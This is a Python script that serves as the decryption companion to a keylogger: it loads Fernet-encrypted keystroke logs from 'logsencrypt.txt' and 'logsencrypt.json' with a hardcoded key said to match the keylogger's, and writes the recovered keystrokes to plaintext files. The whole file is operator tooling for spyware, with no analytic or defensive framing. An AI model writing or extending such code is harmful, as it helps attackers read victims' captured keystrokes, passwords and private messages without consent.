import json
from cryptography.fernet import Fernet

# Replace this key with the same encryption key used in the keylogger
encryption_key = b'Pgizs8I6ElgFIvrvZ7hAs36gxqv464dSMPCJz5n__nQ='

def decrypt_data(encrypted_data):
    cipher_suite = Fernet(encryption_key)
    decrypted_data = cipher_suite.decrypt(encrypted_data)
    return decrypted_data.decode()

def read_and_decrypt_txt_file():
    with open('logsencrypt.txt', 'rb') as key_stroke:
        encrypted_data = key_stroke.read()
        return decrypt_data(encrypted_data)

def read_and_decrypt_json_file():
    with open('logsencrypt.json', 'rb') as key_log:
        encrypted_data = key_log.read()
        decrypted_data = decrypt_data(encrypted_data)
        return json.loads(decrypted_data)

# Decrypt data and save to 'logsdecrypt.txt'
decrypted_txt_data = read_and_decrypt_txt_file()
with open('logsdecrypt.txt', 'w') as file:
    file.write(decrypted_txt_data)

# Decrypt data and save to 'logsdecrypt.json'
decrypted_json_data = read_and_decrypt_json_file()
with open('logsdecrypt.json', 'w') as file:
    json.dump(decrypted_json_data, file)

print("[+] Running Decrypted Keylogger successfully!\n[!] Saving the decrypted key logs in 'logsdecrypt.txt' and 'logsdecrypt.json'")
